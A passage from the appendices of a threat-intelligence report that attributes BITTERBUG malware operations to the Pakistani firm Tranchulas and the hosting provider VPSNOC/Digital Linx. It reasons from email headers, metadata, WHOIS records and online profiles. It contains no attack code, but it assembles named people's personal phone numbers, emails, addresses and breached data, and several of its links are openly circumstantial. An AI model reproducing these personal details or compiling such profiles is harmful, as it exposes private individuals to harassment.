Kansas-City-based hosting provider sent an introductory email message on July 24th, 2013 at 1500 CDT and would be\n\nreceived by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th, 2013 at 1200 PKT. [49]\n\nAnalysis of the VPSNOC email[50] header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT, which\n\nis consistent with Pakistan’s time zone. Of note, the email message was sent with an X-Originating IP Address of 184.75.214.10\n\ncorresponding to a Private Internet Access[51] Canadian proxy[52]. VPSNOC’s use of this commercial proxy service likely\n\ndemonstrates the intent to mask the apparent origin of the sender.\n\nThese two examples highlight that VPSNOC’s inbound and outbound email communications consistently utilized a +0500\n\nPakistani timezone.\n\n49 Digital Appendix 1: Raw Email Communications; Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml\n\n50 Digital Appendix 2: Raw Email Communications; Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml\n\n51 https://www.privateinternetaccess.com\n\n52 http://pastebin.com/F261NfYa\n\n\n-----\n\n#### APPENDIX D: Inconsistencies Observed\n\nDue to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within\n\nthe VPSNOC emails, the TCIRT applied additional scrutiny and research of the content within the Tranchulas “Response_\n```\nThreatConnect.docx” to validate their claims. In the following section we will examine the inconsistencies observed. Within the\n\n```\nresponse we observed the following inconsistencies:\n\n###### Inconsistency #1: Day & Date Misalignment within image1.png Screenshot\n\nOur review of the “Response_ThreatConnect.docx”[53] focused in on the email screenshot (Figure 3) image1.png[54] that Khan\n\nprovided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC. Within\n\nthe official response, Zubair Khan indicated that Tranchulas was “already aware of this incident...and contacted hosting\n\n**_company.” The official response included a screenshot depicting an email sent to VPSNOC from an unidentified (redacted)_**\n\ntranchulas.com email address that was sent on “Tue, Jul 21, 2013 at 11:36 PM” with no evidence of the date in which it was\n\nreceived by or responded to by VPSNOC. This message contained a notable misalignment between the date and day of the week.\n\nJuly 21, 2013 was a Sunday, not a Tuesday. “Tuesday” would have pre-dated our official notification that occurred on Wednesday\n\nJuly 24, 2013, and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan\nbased contacts within VPSNOC. The TCIRT subsequently responded to Mr. Khan’s official explanation with a follow-up inquiry,\n\noffering Khan an opportunity to explain the date inconsistency within the email screenshot. Mr. Khan deferred our request to\n\nMr. Hamza Qamar[55], a Penetration Testing Team Lead at Tranchulas, who later responded[56] with a simple denial that the email\n\nmessage had not been altered apart from blurring the name of the original sender.\n\n###### Inconsistency #2: Awareness of Withheld Information\n\nThe email screenshot (image1.png) from within the Tranchulas response demonstrated awareness of information that we initially\n\nwithheld and later released in our blog post: one malware variant[57] that contained a debug string with “umairaziz27” the\n\nsame username as a Tranchulas employee. The Tranchulas message to VPSNOC incorrectly claimed to identify malware on\n\n`199.91.173.43` that contained the “company’s name and...employee’s name”. While it is possible that Tranchulas’ analysts\n\ndiscovered this variant independent of the blog post, it added to the inconsistent elements of the response and further suggested\n\nthat the blog post may have inspired its communications with VPSNOC. We note that we requested additional information such as\n\nthe “detailed analysis report” within the exchange from Tranchulas but did not receive a response.\n\n###### Inconsistency #3: Tranchulas Direct Notification\n\nThe Tranchulas response indicates that “Tranchulas’ research team was already aware of this incident before publication\n\n**_of this report. Our team contacted hosting company of server to seek an explanation.” Considering there are no_**\n\npublic references to the identified infrastructure identifying VPSNOC as the “hosting company”. The only way for Tranchulas to\n\nidentify VPSNOC as the hosting company was to either have previous insider knowledge of the activity, or to have been privately\n\nintroduced by the Kansas-City-based service provider to their “client” VPSNOC, of which was never mentioned or discussed when\n\nwe initially exchanged with either the Kansas-City or Pakistan-based hosting providers.\n\n53 Digital Appendix 1: Research Collateral Response_ThreatConnect.docx (MD5: 6f7010a28f33be02d85deb9ba40ec222)\n\n54 Digital Appendix 1: Research Collateral image1.png (MD5: d224f39f8e20961b776c238731821d16)\n\n55 http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109\n\n56 \u0007Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml\n\n57 https://www.virustotal.com/en/file/b9a062e84ab64fc55dedb4ba72f62544eb66d7e1625059d2f149707ecd11f9c0/analysis/\n\n\n-----\n\nPublic registration of the 199.91.173.43 reveals the Kansas-City-based hosting provider as the official registrant and owner\n\nof the infrastructure. The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly\n\nfrom them. There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the\n```\n199.91.173.43. Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013, they would have\n\n```\nlikely done so through the Kansas-City-based hosting provider and not VPSNOC.\n\nOn August 15, 2013, Hamza Qamar’s response to TCIRT’s follow up inquiry to the observed inconsistencies redirected TCIRT\n\npersonnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document\n\nproperties within the Tranchulas email. The TCIRT’s suspicion mounted when presenting Tranchulas with the opportunity to set the\n\nrecord straight, that Tranchulas could not substantiate their claims, rather deferring the TCIRT inquiry to a third party (VPSNOC).\n\n###### Inconsistency #4: Tranchulas obtains similar response that TCIRT obtained\n\nWithin the “Response_ThreatConnect.docx“ the image “image1.png” contains an undated response from VPSNOC to the\n\n“Tue, Jul 21, 2013” Tranchulas notification. The undated VPSNOC response that Tranchulas received is nearly identical to the\n\nresponse that TCIRT and the Kansas-City-based service provider obtained on July 24th. Tranchulas does not include the date or\n\ntime as to when they obtained a response from VPSNOC.\n\nThe TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way\n\nthat they knew about the activity or had been previously contacted by either party. When considering all of the inconsistencies,\n\norder of events and studying, Gmail webmail layout, similarities of keywords, salutations and closings within the “Tue, Jul 21,\n\n2013” Tranchulas notification and the respective VPSNOC response. The TCIRT grew increasingly suspicious of the exchanges\n\nwith VPSNOC and subsequent exchanges with Tranchulas personnel.\n\n###### Inconsistency #5: Similar Document Metadata Properties\n\nAnalysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations,\n\nReport.docx[58] and Naxalites_Funded_by_Pakistan.docx[59], both maintained the author properties of “hp”. In reviewing the\n\ndocument metadata within the “Response_ThreatConnect.docx“ that was sent from Mr. Zubair Khan on August 6, 2013, the\n\nTCIRT also identified that this document maintained the creator properties of “hp.” (Figure 10)\n\nWhile the author field of “hp” doesn’t conclusively prove a relationship, it contributes to a body of circumstantial evidence which\n\nmatches the document properties of the official Tranchulas response to the document properties that were also found within\n\ndecoy documents that were bundled with BITTERBUG implants.\n\n58 https://www.virustotal.com/en/file/7e940115988d64fbf7cd3b0d86cd2440529f921790578a96acac4c027120e0c5/analysis/\n\n59 https://www.virustotal.com/en/file/f689d9990a23fbde3b8688b30ff606da66021803390d0a48d02fad93dc11fa15/analysis/\n\n\n-----\n\n#### APPENDIX E: VPSNOC & Digital Linx Associations\n\nAccording to the vpsnoc.com website “In 2007 five VPS experts decided to invest in their very own private rack space in the heart\n\n_of Kansas, the United States. Their aim? To bring service-oriented, quality managed and unmanaged VPS solutions to clients_\n\n_all over the world. Just 1 year later, after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients_\n\n_receiving quality U.S support. Their company continued to build momentum.” [60]_\n\nWhois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant\n\norganization with a Kansas City-based address, telephone number 925-665-1427, and administrative email address admin@digitallinx.\n\norg.[61] This is the same registrant record for the digitallinx.net domain.[62] The digitallinx.net/sitemap.xml[63] and the corresponding Google\n\ncache[64] for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same\n\ntime. The digitallinx.net/Contact.html[65] identified similar overlaps with data across the .org, .net, and .com domains.\n\nThe domain digitallinx.com is registered to Perasona #1.[66 67 68 69] He uses email addresses naseer@digitallinx.com and nbhatti@\n\ngmail.com as the domain registrant email address, along with address 638-F Johar Town, Lahore Pakistan and telephone\n\n966.548805579.[70] The DigitalLinx (digitallinx.com) website states that it is “a web hosting / Web Solutions & Processing\n\n_Outsourcing Company based in Pakistan”._\n\nOpen source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for\n\ndefiantmarketing.com. This domain is registered by Persona #2 [71] who uses the aliases “agnosticon” and “agnostic”. Persona #2 lists VPSNOC\n\nas the registrant organization, and uses the registration email address of abunasar@yahoo.com with an address of House 12, Street 21, F-8/1\n\nIslamabad Federal 44000. The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services.\n\nWithin a January 2009 posting to a Debian users forum, Persona #2 sends an email from the abunasar@yahoo.com with a reply-to as\n\nabunasar@army.com.[72] Within the post, Persona #2 responds to the question “Who’s using Debian” listing DigitalLinx, Kansas City MO and\n\nthe link to digitallinx.com. Also, the seemingly abandoned Twitter profile for Persona #2[73] is only following the Twitter profile for @VPSNOC.[74]\n\nIn an April 2012 post to blackhatworld.com, a user with the alias “agnosticon” posted promotional codes for VPSNOC hosting\n\nservices, engaging with customers, providing them feedback regarding VPS services and thanking them for positive reviews.[75]\n\nWithin the posting the user “agnosticon” included an image which was an actual advertisement that was hosted at http://vpsnoc.\n\ncom/order.png.[76 77] Within the posted image it states “VPSNOC is a subdivision of Digital Linx Hosting. We have been in business since\n\n_2008”. The posting concludes with “If you have any further questions/queries please contact us directly at: support@vpsnoc.com”_\n\n60 http://vpsnoc.com\n\n61 https://whois.domaintools.com/vpsnoc.com\n\n62 https://whois.domaintools.com/digitallinx.net\n\n63 digitallinx.net/sitemap.xml\n\n64 http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us\n\n65 digitallinx.net/Contact.html\n\n66 https://whois.domaintools.com/digitallinx.com\n\n67 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n\n68 https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ\n\n69 Appendix F: Personas; Persona #1 Muhammad Naseer Bhatti\n\n70 https://github.com/digitallinx/vBilling/blob/master/CHANGELOG\n\n71 Appendix F: Personas; Persona #2 Abunasar Khan\n\n72 https://lists.debian.org/debian-www/2009/01/msg00186.html\n\n73 https://twitter.com/abunasar\n\n74 https://twitter.com/vpsnoc\n\n75 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n\n76 http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html\n\n77 http://vpsnoc.com/order.png\n\n\n-----\n\n#### APPENDIX F: Personas\n\n###### Persona #1:\n\nMuhammad Naseer Bhatti’s LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling (vbilling.org)\n\nas well as a consultant for a U.S. company[78]. Both Bhatti and Digital Linx are listed as the registrants for vbilling.org[79], v-billing.\n\ncom[80], vgriffins.com[81] and my-server.co[82], which use P.O. Box 295658, Riyadh Saudi Arabia[83] as the registration address. This\n\nis also the address for two U.S. companies’ local operations. Bhatti is also listed as the owner of the netblock 46.4.139.224/28.\n\nBoth passive DNS sources as well as Robtex[84] highlight this overlapping infrastructure.[85]\n\nFrom September 7 - 9, 2011, Tranchulas in cooperation with the Pakistan National University of Sciences and Technology[86]\n\n(NUST), offered a Certified Penetration Testing Profession (CPTP) Workshop[87] (Figure 17). During the workshop, basic penetration\n\ntechniques and skills were presented[88]. It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the\n\nopportunity to recruit student interns.[89]\n\n78 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n\n79 http://whois.domaintools.com/vbilling.org\n\n80 http://whois.domaintools.com/v-billing.com\n\n81 http://whois.domaintools.com/vgriffins.com\n\n82 http://whois.domaintools.com/my-server.co\n\n83 http://saudi.emc.com/contact/contact-us.htm\n\n84 https://www.robtex.com/dns/digitallinx.com.html\n\n85 http://whatmyip.co/info/whois/46.4.139.225\n\n86 www.nust.edu.pk\n\n87 http://seecs.nust.edu.pk/Seminars_workshops/pages/tranchulas_hacking_workshop/index.php\n\n88 Digital Appendix 1: Research Collateral (Program.pdf)\n\n89 http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profiles%20booklet-%202013%20(SEECS).pdf\n\n\n-----\n\n**Figure 17: Muhammad Nasser Tranchulas CPTP Registration Point of Contact**\n\nWithin the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number (051\n2871433)[90].

In a June 2012 episode of Engineering and Technology Magazine[92] podcast a Mohammed\n\nNasser, Penetration Tester at Tranchulas was interviewed[93]. A Mohammed Nasser may also be directly affiliated[94] with Tranchulas.\n\n**Figure 18: Muhammad Nasser Bhatti Dropping Family Name**\n\nThis links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer. It is unknown if this is the same\n\nMuhammad Naseer that is associated with VPSNOC’s parent company Digital Linx, the Pakistan-based service provider which\n\nhosted the original BITTERBUG malware.\n\n92 http://eandt.theiet.org/magazine/2012/06/\n\n93 http://eandt.theiet.org/magazine/2012/06/et-podcast-18.cfm\n\n94 http://www.zoominfo.com/s/#!search/profile/person?personId=1627460418&targetid=profile\n\n\n-----\n\n###### Persona #2:\n\nAbunasar Khan also maintains the aliases “agnosticon”[95] and “agnostic”[96] in addition to the email addresses abunasar@yahoo.\n\ncom and abunasar@army.com. He has been previously associated[97]with VPSNOC & Digital Linx. An April 2012 Whois registrant\n\nrecord for the domain zeusadnetwork.com[98] includes the first and last name Khan along with the same (925) 665-1427 phone\n\nnumber seen within the Digial Linx Hosting domains.\n\nKhan registered a variety of domains, many of which use his abunasar.net[99] for name services and abunasar.yahoo.com within\n\nthe Start of Authority (SOA) records. For example a July 2014 record (Figure 19) for defiantmarketing.com[100] and an August 2013\n\nrecord (Figure 20) for ns2.vpsnoc.com both maintain these references.\n\n**Figure 19: SOA record for defiantmarketing.com (July 2014)**\n\n95 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n\n96 http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115\n\n97 http://www.webhostingtalk.com/showthread.php?t=723658\n\n98 http://whois.domaintools.com/zeusadnetwork.com\n\n99 http://whois.domaintools.com/abunasar.net\n\n100 http://bgp.he.net/dns/defiantmarketing.com\n\n\n-----\n\n**Figure 20: SOA Record for vpsnoc.com (August 2013)**\n\nAbunasar Khan registered abunasar.net and previously (May 2007) and maintained whitehate.org[101], which have both been used\n\nto demonstrate an affinity for and alignment with AntiSec and Anonymous movements.[102] The abunasar.net website prominently\n\ndisplays ascii art of the term “antisec” with antisec related content “Blend in. Get trusted. Trust nobody. Own everybody. Disclose\n\n_nothing. Destroy everything. Take back the scene.” This is a shared affinity that is also reflected amongst with the culture of_\n\nTranchulas employees.[103 104 105] The pure.whitehate.org domain has also been previously associated with Khan, examples can be\n\nfound within #phrack and #darknet IRC sessions.[106 107]\n\nIronically, in February 2011, Khan’s Rootkit.com user profile was compromised revealing his profile’s username, password hash,\n\nemail (abunasar@army.com), and the registration IP address of 202.125.143.67 (Islamabad, Pakistan).[108] During his registration,\n\nKhan specified the name “anony mo us” when registering the profile. As of 16 August 2013, a Pastebin post contained details of\n\na customer database compromise for nowclothing.pk, which included Khan’s name, email abunasar@army.com, and cell phone\n\nnumber 03215488881.[109] [110]\n\nResearch of the 03215488881 cell phone number yields a user profile “abunasark” in an April 2009 posting.[111] Khan posts\n\npictures of his blue Baleno and includes another phone number 03234764838.[112] In a secondary profile user “Ak” uses the same\n\ncell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno.[113 114]\n\n101 https://whois.domaintools.com/whitehate.org\n\n102 https://whois.domaintools.com/abunasar.net\n\n103 https://www.facebook.com/media/set/?set=a.542485719112184.135023.132987340062026&type=3\n\n104 http://youtube.com/watch?v=w3DjOuEI0vs.mov\n\n105 Digital Appendix 3: Screenshot Archives (youtube.com/watch?v=w3DjOuEI0vs.mov)\n\n106 http://pastebin.com/rqVGqh1q\n\n107 http://shootingsawk.lescigales.org/misc/owneddarknet.txt\n\n108 https://dazzlepod.com/rootkit/?page=284\n\n109 http://pastebin.com/ktR3qM3K\n\n110 Digital Appendix 3: Screenshot Archives (pastebin.com/ktR3qM3K.png)\n\n111 http://www.pakwheels.com/forums/user/abunasark\n\n112 http://www.pakwheels.com/forums/members-member-rides/99428-white-baleno-not-anymore-comments-please-p-4\n\n113 http://www.motors.pk/ak-22.htm\n\n114 http://www.motors.pk/used-cars/suzuki-baleno-2004-for-sale-in-islamabad-22.htm\n\n\n-----\n\nKhan’s affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan\n\nat VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com.[115 116]\n\nLater in a June 2009 posting, Khan using the alias “agnostic” attempts to sell the domain clubaleno.co.uk and uses his abunasar@\n\narmy.com email address as a point of contact.[117]\n\nKhan is also observed using the alias “agnosticon” and a Toyota Racing Development avitar within posts to blackhatworld.com\n\nand again within a 2011 post where he posts a cpanel error that also includes his “abunasar” username within system output.[118]\n\nThe Google+ profile for Khan[119] reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and\n\na Digital Linx employee Shoaib Riaz[120] who also maintains a social network association with the Digital Linx founder Muhammad\n\nNasser Bhatti.[121]\n\n115 http://www.sitetrail.com/clubaleno.co.uk\n\n116 http://dawhois.com/site/clubaleno.co.uk.html\n\n117 http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115\n\n118 http://forums.cpanel.net/f5/help-yum-broke-rpm-db-broke-somehow-httpd-wont-start-238511.html\n\n119 https://plus.google.com/103436628630566104748/posts\n\n120 https://plus.google.com/105059395104464629441/about\n\n121 https://plus.google.com/105855064276291727409/posts\n\n\n-----\n\n#### APPENDIX G: Tranchulas\n\nThe Tranchulas website[122] states that they provide a range of security services and training to include penetration and offensive\n\ncyber initiative (OCI), in which they “help national level cyber security programs on strategies for managing offensive technical\n\n_threats”. In a September 2011 YouTube user “tranchulascert” posted a video titled “Tranchulas Cyber Ranges - P@sha ICT Awards_\n\n2011[123]”, where they awarded runner up[124]. Within the video, the cyber ranges were referenced as being developed for “defense\n\nforces” that were aimed to “help them in developing offensive and defensive warfare skills” and “combating anti-state hackers”.\n\nAlthough Tranchulas[125] brands itself as a multi-national company, their respective operating addresses within United Kingdom[126]\n\nthe United States[127] and New Zealand[128] are all associated with either virtual office spaces or address forwarding services. The\n\nTranchulas website lists its Pakistan address within the 2[nd] floor of the Evacuee Trust Complex[129] on Sir Agha Khan Road F-5/1\n\nIslamabad 44000. The Evacuee Trust Complex is also known as Software Technology Park 2[130] or STP2 and hosts a variety[131] of\n\nother commercial and government offices.\n\nThe Tranchulas employee, Hamza Qamar, that handled the response to our inquiry has a public LinkedIn[132] profile that states that\n\nhe “Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal\n\n_agencies, DoD, and commercial clients.” The profile does not specify if DoD is a reference to the U.S. Department of Defense or_\n\nanother country’s Ministry of Defense. Interestingly, Qamar’s Google+ page showed one “friend” in his circle despite more than 40\n\nfollowers, Abunasar Khan a VPSNOC employee.\n\nIt is likely that Tranchulas provides services to the Pakistani government. The offensive cyber initiative services offered by\n\nTranchulas is offered to “national-level cyber security programs” suggesting a commercial demand from “national-level” customers.\n\nThe stated purpose and intent of the Tranchulas “Cyber Ranges” P@sha ICT 2011 awards video suggests the ranges were\n\nspecifically developed in support of national interests for offensive and defensive purposes. The domain registration by Zubair\n\nKhan using an official Pakistani government address with his zubair@tranchulas.com email address indicates that Khan may have\n\nor currently maintains a physical address at a location where other Pakistani government officials reside.\n\nHistoric Whois registration records for the domains textcrypter.com[133], taggnation.com[134], bookadoconline.com[135] and saadiakhan.\n\nnet[136] lists Tranchulas CEO Zubair Khan (zubair@tranchulas.com[137]) as the registrant for the domains. At the time of registration\n\nKhan used the address 15-B, Mehran Block of the Gulshan-e-Jinnah F-5/1 Islamabad Pakistan for the domains.\n\n122 http://tranchulas.com\n\n123 https://www.youtube.com/watch?v=FAM6JxOHdo8\n\n124 http://pashaictawards.com/?page_id=1644\n\n125 http://tranchulas.com/contact-us/\n\n126 http://www.londonpresence.com/contact-us/\n\n127 http://nextspace.us/nextspace-union-square-san-francisco/\n\n128 http://www.privatebox.co.nz/virtual-office/virtual-office-address.php\n\n129 https://www.facebook.com/EvacueeTrustComplex\n\n130 http://wikimapia.org/425791/Evacuee-Trust-Complex\n\n131 https://www.facebook.com/EvacueeTrustComplex/photos/a.554791821273808.1073741825.404981572921501/554791824607141/\n\n132 http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109\n\n133 https://whois.domaintools.com/textcrypter.com\n\n134 https://whois.domaintools.com/taggnation.com\n\n135 https://whois.domaintools.com/bookadoconline.com\n\n136 https://whois.domaintools.com/saadiakhan.net\n\n137 https://reversewhois.domaintools.com/?email=b249ca637ef7cc55a0136bcda9dca0d3\n\n\n-----\n\nIn an April 2008 Request for Proposals, the Pakistan Public Works Department issued a tender[138] for the Constriction of\n\nGovernment Servant Quarters and Garages at Gulshan-e-Jinnah Complex F-5/1 Islamabad. Later in May of 2010 within a\n\nPakistani Senate[139] question and answer session, the Gulshan-e-Jinnah Complex was cited under Federal Lodges / Hostels in\n\nIslamabad under the control of Pakistan Ministry for Housing and Works. A December 2010 TheNews Pakistan ran a story[140]\n\nthat detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated\n\nat Gulshan-e-Jinnah. According to Google Maps[141] it is approximately 650 meters (8 minute walk) from the Gulshan-e-Jinnah\n\nComplex to the Tranchulas offices within the Evacuee Trust Complex.\n\nWithin a May 2013 interview[142] Khan specified that he comes from a family with a strong military background. He detailed his\n\ninterest in “the world of hacking” grew during his teen years, referencing his father’s diplomatic assignment to the Philippines in\n\n2003. Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National\n\nDatabase and Registration Authority (NADRA).\n\n138 http://www.dgmarket.com/tenders/np-notice.do?noticeId=2466880\n\n139 http://www.senate.gov.pk/uploads/documents/questions/1317711132_399.pdf\n\n140 http://www.thenews.com.pk/Todays-News-2-22150-Bureaucrats-journalists-avail-cheaper-accommodation\n\n141 \u0007https://www.google.com/maps/dir/Tranchulas,+Islamabad,+Pakistan/Gulshan-e-Jinnah+Complex,+Islamabad,+Pakistan/@33.7327466,7\n3.0877996,17z/data=!4m13!4m12!1m5!1m1!1s0x38dfc0820ff3f9e3:0x4b3eb557d9cd81c3!2m2!1d73.088686!2d33.73353!1m5!1m1!1s0\nx38dfc0818a64f1d7:0x82c3bee2d49d88ab!2m2!1d73.089409!2d33.73263?hl=en-US\n\n142 http://bluechipmag.com/qa-with-zubair-khan/\n\n\n-----\n\n###### Digital Appendix 1: Research Collateral\n\nDigital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research.\n\n\n-----\n\n###### Digital Appendix 2: Raw Email Communications\n\nDigital Appendix 2 contains raw email communications.
